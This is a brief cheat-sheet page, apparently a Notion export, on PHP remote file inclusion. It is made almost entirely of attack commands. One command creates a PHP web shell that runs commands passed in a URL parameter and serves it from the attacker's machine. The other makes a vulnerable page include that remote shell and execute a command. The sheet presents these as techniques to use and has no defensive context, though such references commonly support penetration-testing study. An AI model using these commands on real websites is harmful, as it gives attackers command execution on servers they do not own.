# PHP RFI Examples

OS: PHP, Web
Description: RFI PHP Techniques
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21)

| **RFI** |  |
| --- | --- |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |